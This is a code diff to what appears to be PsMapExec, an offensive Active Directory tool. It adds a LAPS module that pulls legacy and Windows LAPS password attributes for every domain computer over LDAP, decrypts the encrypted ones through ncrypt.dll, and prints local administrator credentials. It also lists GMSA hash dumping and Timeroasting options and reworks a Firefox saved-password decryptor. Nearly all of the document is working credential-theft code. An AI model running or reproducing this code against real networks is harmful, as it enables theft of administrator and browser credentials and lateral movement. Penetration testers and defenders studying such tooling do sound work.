@@ -700,6 +700,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
             "GMSA" {}
             "KerbDump" {}
             "Interactive" {}
+            "LAPS" {}
             "LogonPasswords" {}
             "LSA" {}
             "LSA-Trust" {}
@@ -798,6 +799,11 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
                     Write-Host
                     Write-Host "    Privilege Escalation:"
                     Write-Host "       Elevate                   -> Escalate user for DCSync"
+                    Write-Host
+                    Write-Host "    Credential Extraction:"
+                    Write-Host "       LAPS                      -> Read LAPS Passwords"
+                    Write-Host "       GMSA                      -> Dump GMSA hashes"
+                    Write-Host "       TimeRoast                 -> Perform Timeroasting"
                     Write-Host
                     Write-Host "    Authentication:"
                     Write-Host "       Whoami                    -> Show current user context"
@@ -1108,6 +1114,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
         "ConstrainedDelegation",
         "Elevate",
         "GMSA",
+        "LAPS",
         "MAQ",
         "RemoveComputer",
         "RemoveFromGroup",
@@ -6314,6 +6321,285 @@ while (`$true) {
                     
 
                 }
+
+                if ($Module -eq "LAPS") {
+
+                    try {
+                        Add-Type -Language CSharp -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Natives
+{
+    [Flags]
+    public enum ProtectFlags
+    {
+        NCRYPT_SILENT_FLAG = 0x00000040,
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+    public delegate int PFNCryptStreamOutputCallback(
+        IntPtr pvCallbackCtxt,
+        IntPtr pbData,
+        int cbData,
+        [MarshalAs(UnmanagedType.Bool)] bool fFinal
+    );
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+    public struct NCRYPT_PROTECT_STREAM_INFO
+    {
+        public PFNCryptStreamOutputCallback pfnStreamOutput;
+        public IntPtr pvCallbackCtxt;
+    }
+
+    [Flags]
+    public enum UnprotectSecretFlags
+    {
+        NCRYPT_UNPROTECT_NO_DECRYPT = 0x00000001,
+        NCRYPT_SILENT_FLAG = 0x00000040,
+    }
+
+    [DllImport("ncrypt.dll")]
+    public static extern uint NCryptStreamOpenToUnprotect(
+        ref NCRYPT_PROTECT_STREAM_INFO pStreamInfo,
+        ProtectFlags dwFlags,
+        IntPtr hWnd,
+        out IntPtr phStream
+    );
+
+    [DllImport("ncrypt.dll")]
+    public static extern uint NCryptStreamUpdate(
+        IntPtr hStream,
+        IntPtr pbData,
+        int cbData,
+        [MarshalAs(UnmanagedType.Bool)] bool fFinal
+    );
+
+    [DllImport("ncrypt.dll")]
+    public static extern uint NCryptUnprotectSecret(
+        out IntPtr phDescriptor,
+        Int32 dwFlags,
+        IntPtr pbProtectedBlob,
+        uint cbProtectedBlob,
+        IntPtr pMemPara,
+        IntPtr hWnd,
+        out IntPtr ppbData,
+        out uint pcbData
+    );
+
+    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
+    public static extern uint NCryptGetProtectionDescriptorInfo(
+        IntPtr hDescriptor,
+        IntPtr pMemPara,
+        int dwInfoType,
+        out string ppvInfo
+    );
+}
+"@
+                    }
+                    
+                    Catch {}
+
+                    function Decrypt-LapsV2 {
+                        [CmdletBinding()]
+                        param(
+                            [Parameter(Mandatory = $true)]
+                            [byte[]]$EncryptedBlob
+                        )
+
+                        
+                        $Script:DecryptedPasswordValue = $null
+                        $Callback = [Natives+PFNCryptStreamOutputCallback] {
+                            param(
+                                [IntPtr]$Context,
+                                [IntPtr]$BufferPtr,
+                                [int]$BufferLength,
+                                [bool]$FinalBlock
+                            )
+
+                            if ($BufferLength -gt 0) {
+                                $Bytes = New-Object byte[] $BufferLength
+                                [System.Runtime.InteropServices.Marshal]::Copy(
+                                    $BufferPtr, $Bytes, 0, $BufferLength
+                                )
+
+                                $Plain = [System.Text.Encoding]::Unicode.GetString($Bytes)
+                                Set-Variable -Name DecryptedPasswordValue -Value $Plain -Scope Script
+                            }
+
+                            return 0
+                        }
+
+                        # Prepare NCRYPT_PROTECT_STREAM_INFO structure
+                        $StreamInfo = [Natives+NCRYPT_PROTECT_STREAM_INFO]::new()
+                        $StreamInfo.pfnStreamOutput = $Callback
+                        $StreamInfo.pvCallbackCtxt = [IntPtr]::Zero
+
+                        # Handles
+                        $StreamHandle = [IntPtr]::Zero
+                        $DescriptorHandle = [IntPtr]::Zero
+                        $UnusedPtr = [IntPtr]::Zero
+                        $UnusedLength = 0
+
+                        # Open decrypt stream
+                        $Result = [Natives]::NCryptStreamOpenToUnprotect(
+                            [ref]$StreamInfo,
+                            [Natives+ProtectFlags]::NCRYPT_SILENT_FLAG,
+                            [IntPtr]::Zero,
+                            [ref]$StreamHandle
+                        )
+
+                        if ($Result -ne 0) {
+                            return $null
+                        }
+
+                        # Strip 16-byte msLAPS header
+                        $PayloadLength = $EncryptedBlob.Length - 16
+                        if ($PayloadLength -le 0) { return $null }
+
+                        $PayloadPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PayloadLength)
+                        [System.Runtime.InteropServices.Marshal]::Copy($EncryptedBlob, 16, $PayloadPtr, $PayloadLength)
+
+                        try {
+                            # Pull decryptor inf
+                            $null = [Natives]::NCryptUnprotectSecret(
+                                [ref]$DescriptorHandle,
+                                0x41,
+                                $PayloadPtr,
+                                [uint32]$PayloadLength,
+                                [IntPtr]::Zero,
+                                [IntPtr]::Zero,
+                                [ref]$UnusedPtr,
+                                [ref]$UnusedLength
+                            )
+
+                            # Perform decryption
+                            $null = [Natives]::NCryptStreamUpdate(
+                                $StreamHandle,
+                                $PayloadPtr,
+                                $PayloadLength,
+                                $true
+                            )
+                        }
+                        finally {
+                            if ($PayloadPtr -ne [IntPtr]::Zero) {
+                                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PayloadPtr)
+                            }
+                        }
+
+                        return $DecryptedPasswordValue
+                    }
+
+
+                    $DN   = "DC=$($Domain.Replace('.', ',DC='))"
+                    $LDAP = "LDAP://$TargetIP/$DN"
+                
+                    if ($Username -and $Password) {
+                        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP, $Username, $Password)
+                    }
+                
+                    else {
+                        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+                    }
+                
+                    $Searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$directoryEntry)
+                    $Searcher.PageSize = 1000
+                                    
+                    if ($TargetDN){
+                        $Searcher.Filter = "(&(objectCategory=computer)(distinguishedName=$TargetDN))"
+                    }
+
+                    else {
+                        $Searcher.Filter = "(&(objectCategory=computer)(objectClass=computer))"
+                    }
+                                    
+                    $Searcher.PropertiesToLoad.Add("description")                       > $null                    
+                    $Searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd")                     > $null
+                    $Searcher.PropertiesToLoad.Add("sAMAccountName")                    > $null                    
+                    $Searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwdExpirationTime")       > $null
+
+                    $searcher.PropertiesToLoad.Add("msLAPS-Password")                   > $null
+                    $searcher.PropertiesToLoad.Add("msLAPS-EncryptedPassword")          > $null
+                    $searcher.PropertiesToLoad.Add("msLAPS-PasswordExpirationTime")     > $null
+                    $searcher.PropertiesToLoad.Add("msLAPS-EncryptedPasswordHistory")   > $null 
+                
+                    $Results = $Searcher.FindAll()
+                
+                    $LAPS_Data = foreach ($Result in $Results) {
+                        [PSCustomObject]@{
+                            ComputerName    = $Result.Properties["samaccountname"][0]
+                            Password        = $Result.Properties["ms-mcs-admpwd"][0]
+                            #ExpirationTime = [DateTime]::FromFileTime($Result.Properties["ms-Mcs-AdmPwdExpirationTime"][0])
+                            
+                            v2Password          = $Result.Properties["msLAPS-Password"][0]
+                            v2EncryptedPassword = $Result.Properties["msLAPS-EncryptedPassword"][0]
+                            v2Expires           = [DateTime]::FromFileTime($Result.Properties["msLAPS-PasswordExpirationTime"][0])
+                        }
+                    }
+
+                    $ResultCountv1 = $LAPS_Data | Where-Object { $_.Password }
+                    $ResultCountv2 = $LAPS_Data | Where-Object { $_.v2EncryptedPassword -or  $_.v2Password }
+                
+                    if ($ResultCountv1 -eq $null  -and $ResultCountv2 -eq $null) {
+                        $Searcher.Dispose() > $null
+                        return "No Results"
+                    }
+                         
+                    if ($ResultCountv1 -ne $null){
+                        $Output += "`n"
+                        $Output += "[*] Legacy LAPS `n"
+                    }
+                
+                    $Output += ($LAPS_Data | Sort-Object Computer | Where-Object { $_.Password } | Select-Object -Property ComputerName, Password | Format-Table -AutoSize | Out-String)
+                    
+                    if ($ResultCountv2 -ne $null){
+                        $Output += "`n"
+                        $Output += "[*] Windows LAPS `n"
+                    }
+
+                    $LAPSv2_Output = @()
+
+                    $LAPSv2_Output = foreach ($LAPSv2_DATA in $LAPS_Data) {
+                        
+                        if (-not $LAPSv2_DATA.v2EncryptedPassword -and (-not $LAPSv2_DATA.v2Password )) { continue }
+
+                        if ($LAPSv2_DATA.v2EncryptedPassword){
+
+                        $Raw = Decrypt-LapsV2 -EncryptedBlob $LAPSv2_DATA.v2EncryptedPassword
+                        $LAPS_Username = [regex]::Match($Raw, '"n":"([^"]+)"').Groups[1].Value
+                        $LAPS_Password = [regex]::Match($Raw, '"p":"([^"]+)"').Groups[1].Value
+                        $STATUS_Encrypted = "msLAPS-EncryptedPassword"
+                        
+                        }
+
+                        if ($LAPSv2_DATA.v2Password){
+
+                        $Raw = $LAPSv2_DATA.v2Password
+                        $LAPS_Username = [regex]::Match($Raw, '"n":"([^"]+)"').Groups[1].Value
+                        $LAPS_Password = [regex]::Match($Raw, '"p":"([^"]+)"').Groups[1].Value
+                        $STATUS_Encrypted = "msLAPS-Password"
+                        }
+
+
+
+                        [PSCustomObject]@{
+                            ComputerName      = $LAPSv2_DATA.ComputerName
+                            Username          = $LAPS_Username
+                            Password          = $LAPS_Password
+                            #ExpirationTime   = $LAPSv2_DATA.v2Expires
+                            Attribute        = $STATUS_Encrypted
+                        }
+                    }
+
+
+                    $Output += ($LAPSv2_Output | Sort-Object ComputerName | Format-Table -AutoSize | Out-String)
+                                    
+                    $Searcher.Dispose() > $null
+                                    
+                    return $Output
+                }
+                
+                             
 
                 if ($Module -eq "DomainSID") {
                     
@@ -16543,25 +16829,33 @@ $FF_Profile_Logins_Array = foreach ($FF_Profile in $FF_Profile_Array) {
 
 if ($FF_Profile_Logins_Array.Count -lt 1) { return 'No Results' }
 
-$AllResults = foreach ($FF_Profile_Login_File in $FF_Profile_Logins_Array) {
+$AllResults = @()
+
+foreach ($FF_Profile_Login_File in $FF_Profile_Logins_Array) {
     $ProfileDir = Split-Path $FF_Profile_Login_File -Parent
     
     try {
         $PasswordData = Get-Content -Path $FF_Profile_Login_File -Raw | ConvertFrom-Json
         
         if ($PasswordData.logins) {
+
             foreach ($login in $PasswordData.logins) {
                 $decryptedUsername = ConvertFrom-NSS -Data $login.encryptedUsername -ProfileDir $ProfileDir
                 $decryptedPassword = ConvertFrom-NSS -Data $login.encryptedPassword -ProfileDir $ProfileDir
                 
                 $PathUser = (($ProfileDir -split '\\Users\\')[1] -split '\\')[0]
-                
-                [PSCustomObject]@{
+
+                $decodedUser = if ($decryptedUsername -and $decryptedUsername.Count -gt 0) { $decryptedUsername } else { $null }
+                $decodedPass = if ($decryptedPassword -and $decryptedPassword.Count -gt 0) { $decryptedPassword } else { $null }
+
+                $obj = [PSCustomObject]@{
                     User     = $PathUser
                     URL      = $login.hostname
-                    Username = if ($decryptedUsername) { $decryptedUsername } else { "Decryption Failed" }
-                    Password = if ($decryptedPassword) { $decryptedPassword } else { "Decryption Failed" }
+                    Username = if ($decodedUser) { $decodedUser } else { "Decryption Failed" }
+                    Password = if ($decodedPass) { $decodedPass } else { "Decryption Failed" }
                 }
+
+                $AllResults += $obj
             }
         }
     }
@@ -16569,11 +16863,14 @@ $AllResults = foreach ($FF_Profile_Login_File in $FF_Profile_Logins_Array) {
 }
 
 if ($AllResults.Count -gt 0) {
-    $AllResults | Sort-Object -Property User, URL, Username, Password -Unique | Format-Table -AutoSize
+    $AllResults |
+        Sort-Object -Property User, URL, Username, Password -Unique |
+        Format-Table -AutoSize
 }
 else {
-    return 'No Results'
+    'No Results'
 }
+
 '@
 
 ################################################################################################################
